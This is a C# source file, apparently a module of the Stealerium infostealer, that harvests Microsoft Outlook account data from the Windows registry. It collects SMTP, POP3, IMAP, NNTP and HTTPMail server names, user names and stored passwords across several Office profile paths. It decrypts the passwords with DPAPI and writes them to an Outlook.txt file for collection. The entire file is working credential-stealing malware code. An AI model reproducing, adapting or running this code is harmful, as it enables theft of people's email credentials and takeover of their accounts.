using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using Stealerium.Helpers;

namespace Stealerium.Target.Messengers;

internal sealed class Outlook
{
	private static readonly Regex MailClient = new Regex("^([a-zA-Z0-9_\\-\\.]+)@([a-zA-Z0-9_\\-\\.]+)\\.([a-zA-Z]{2,5})$");

	private static readonly Regex SmptClient = new Regex("^(?!:\\/\\/)([a-zA-Z0-9-_]+\\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\\.[a-zA-Z]{2,11}?$");

	public static void GrabOutlook(string sSavePath)
	{
		string[] source = new string[4] { "Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676", "Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676", "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676", "Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676" };
		string[] mailClients = new string[28]
		{
			"SMTP Email Address", "SMTP Server", "POP3 Server", "POP3 User Name", "SMTP User Name", "NNTP Email Address", "NNTP User Name", "NNTP Server", "IMAP Server", "IMAP User Name",
			"Email", "HTTP User", "HTTP Server URL", "POP3 User", "IMAP User", "HTTPMail User Name", "HTTPMail Server", "SMTP User", "POP3 Password2", "IMAP Password2",
			"NNTP Password2", "HTTPMail Password2", "SMTP Password2", "POP3 Password", "IMAP Password", "NNTP Password", "HTTPMail Password", "SMTP Password"
		};
		string text = source.Aggregate("", (string current, string dir) => current + Get(dir, mailClients));
		if (!string.IsNullOrEmpty(text))
		{
			Counter.Outlook = true;
			Directory.CreateDirectory(sSavePath);
			File.WriteAllText(sSavePath + "\\Outlook.txt", text + "\r\n");
		}
	}

	private static string Get(string path, string[] clients)
	{
		string text = "";
		try
		{
			string[] array = clients;
			foreach (string text2 in array)
			{
				try
				{
					object infoFromRegistry = GetInfoFromRegistry(path, text2);
					text = ((infoFromRegistry != null && text2.Contains("Password") && !text2.Contains("2")) ? (text + text2 + ": " + DecryptValue((byte[])infoFromRegistry) + "\r\n") : ((infoFromRegistry == null || (!SmptClient.IsMatch(infoFromRegistry.ToString()) && !MailClient.IsMatch(infoFromRegistry.ToString()))) ? (text + text2 + ": " + Encoding.UTF8.GetString((byte[])infoFromRegistry).Replace(Convert.ToChar(0).ToString(), "") + "\r\n") : (text + $"{text2}: {infoFromRegistry}\r\n")));
				}
				catch
				{
				}
			}
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(path, writable: false);
			if (registryKey != null)
			{
				text = registryKey.GetSubKeyNames().Aggregate(text, (string current, string client) => current + Get(path + "\\" + client, clients));
				return text;
			}
			return text;
		}
		catch
		{
			return text;
		}
	}

	private static object GetInfoFromRegistry(string path, string valueName)
	{
		object result = null;
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(path, writable: false);
			if (registryKey != null)
			{
				result = registryKey.GetValue(valueName);
				registryKey.Close();
				return result;
			}
			return result;
		}
		catch
		{
			return result;
		}
	}

	private static string DecryptValue(byte[] encrypted)
	{
		try
		{
			byte[] array = new byte[encrypted.Length - 1];
			Buffer.BlockCopy(encrypted, 1, array, 0, encrypted.Length - 1);
			return Encoding.UTF8.GetString(ProtectedData.Unprotect(array, (byte[])null, (DataProtectionScope)0)).Replace(Convert.ToChar(0).ToString(), "");
		}
		catch
		{
		}
		return "null";
	}
}
